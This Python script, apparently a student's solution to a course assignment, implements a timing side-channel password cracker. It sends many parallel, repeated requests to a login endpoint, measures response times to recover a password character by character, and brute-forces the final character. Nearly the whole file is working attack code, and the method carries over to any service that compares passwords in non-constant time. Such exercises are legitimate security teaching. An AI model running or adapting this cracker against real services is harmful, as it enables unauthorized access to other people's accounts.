import requests
import time
import statistics
from typing import List, Dict, Tuple
import sys
from string import ascii_lowercase
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm



class PasswordCracker:
    def __init__(self, base_url: str = "http://127.0.0.1"):
        self.base_url = base_url
        self.charset = ascii_lowercase
        self.session = requests.Session()
        #self.session.headers.update({'Connection': 'close'})
        self._warmup_connection()

    def _warmup_connection(self):
        """Warm up the server connection."""
        warmup_url = f"{self.base_url}/?user=warmup&password=warmup&difficulty=1"
        try:
            self.session.get(warmup_url)
            time.sleep(0.1)  # Ensure the connection is established
        except Exception:
            pass

    def filter_outliers(self, times: List[float]) -> List[float]:
        """
        Filter outliers using the Interquartile Range (IQR) method.
        Removes values outside the range [Q1 - 1.5 * IQR, Q3 + 1.5 * IQR].
        """
        if len(times) < 4:  # Not enough data for IQR filtering
            return times

        q1 = statistics.quantiles(times, n=4)[0]  # 1st quartile (25%)
        q3 = statistics.quantiles(times, n=4)[2]  # 3rd quartile (75%)
        iqr = q3 - q1
        lower_bound = q1 - 1.5 * iqr
        upper_bound = q3 + 1.5 * iqr

        # Filter out outliers
        filtered_times = [t for t in times if lower_bound <= t <= upper_bound]
        return filtered_times if filtered_times else times  # Fallback if all are filtered

    def measure_parallel(self, username: str, password_guesses: List[str], difficulty: int, num_samples: int) -> Dict[str, float]:
        """
        Measure response times for password guesses in parallel.
        Each password is measured 'num_samples' times for accurate timing analysis.
        """
        url_template = f"{self.base_url}/?user={username}&password={{}}&difficulty={difficulty}"

        def measure_guess(password: str) -> Tuple[str, float]:
            """Send multiple requests, remove outliers, and return average response time with retries."""
            times = []
            url = url_template.format(password)

            for i in range(num_samples):
                for attempt in range(3):  # Retry up to 3 times
                    try:
                        print(f"Measuring response time for password: {password}, no. {i + 1}",
                              file=sys.stderr, flush=True)
                        start_time = time.perf_counter()
                        self.session.get(url)
                        elapsed = time.perf_counter() - start_time
                        times.append(elapsed)
                        break  # Success: Exit retry loop
                    except requests.exceptions.RequestException as e:
                        print(f"Retry {attempt + 1} for {password} due to: {e}",
                              file=sys.stderr, flush=True)
                        self.session = requests.Session()  # Reset session
                        self._warmup_connection()  # Reconnect

            if not times:
                print(f"All retries failed for {password}", file=sys.stderr, flush=True)
                return password, float('inf')  # Return large value to signal failure

            # Filter outliers and calculate median
            #filtered_times = self.filter_outliers(times)
            filtered_times = times
            try:
                return password, statistics.mean(filtered_times)
            except statistics.StatisticsError:
                return password, float('inf')  # Catch empty data if median() fails

        # Use parallel requests
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_password = {executor.submit(measure_guess, pw): pw for pw in password_guesses}
            results = {future_to_password[future]: future.result()[1] for future in future_to_password}

        return results

    def check_password(self, username: str, password: str, difficulty: int = 1) -> bool:
        """Check if a password is correct by looking at the server response."""
        url = f"{self.base_url}/?user={username}&password={password}&difficulty={difficulty}"
        response = self.session.get(url)
        return response.text.strip() == "1"

    def find_password_length(self, username: str, difficulty: int = 1) -> int:
        """
        Find the correct password length using parallel timing analysis.
        """
        max_length = 32
        test_passwords = [f"{'a' * i}" for i in range(1, max_length + 1)]
        results = self.measure_parallel(username, test_passwords, difficulty, num_samples=6)
        best_length = max(results.items(), key=lambda x: x[1])[0]
        return len(best_length)

    def crack_position_parallel(self, username: str, current_password: List[str], position: int, difficulty: int) -> str:
        """
        Crack a single password character using parallel requests with multiple samples.
        Sends all character guesses in parallel and picks the one with the best timing result.
        """
        is_last_char = position == len(current_password) - 1

        if is_last_char:
            # Directly verify last character using server response
            for char in self.charset:
                current_password[position] = char
                if self.check_password(username, "".join(current_password), difficulty):
                    return char
            return 'a'  # Fallback if no match found

        # Generate all character guesses for the current position
        guesses = [f"{''.join(current_password[:position])}{char}{'a' * (len(current_password) - position - 1)}"
                   for char in self.charset]

        # Measure all guesses in parallel with multiple samples
        num_samples = difficulty * 4
        response_times = self.measure_parallel(username, guesses, difficulty, num_samples)

        # Find the best character based on the longest response time
        best_guess = max(response_times.items(), key=lambda x: x[1])[0]
        best_char = best_guess[position]

        for char, time in response_times.items():
            print(f"Character '{char[position]}' at position {position + 1}: {time}",
                  file=sys.stderr, flush=True)

        return best_char

    def crack_password_parallel(self, username: str, difficulty: int = 1) -> str:
        """
        Crack the full password using parallel character guessing with multiple samples.
        """
        #password_length = self.find_password_length(username, difficulty)
        password_length = 16
        print(f"Detected password length: {password_length}", file=sys.stderr, flush=True)

        current_password = ['a'] * password_length

        for position in range(password_length):
            best_char = self.crack_position_parallel(username, current_password.copy(), position, difficulty)
            current_password[position] = best_char

            print(f"Found character at position {position + 1}: '{best_char}'",
                  file=sys.stderr, flush=True)
            print(f"Current password: {''.join(current_password)}", file=sys.stderr, flush=True)

        return "".join(current_password)


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ex01_M1.py username [difficulty]", file=sys.stderr)
        sys.exit(1)

    username = sys.argv[1]
    difficulty = int(sys.argv[2]) if len(sys.argv) > 2 else 2
    base_url = "http://aoi-assignment1.oy.ne.ro:8080"
    #base_url = "http://localhost"

    try:
        cracker = PasswordCracker(base_url)
        password = cracker.crack_password_parallel(username, difficulty)
        print(password)
    except Exception as e:
        print(f"Error occurred: {e}", file=sys.stderr)


if __name__ == "__main__":
    main()
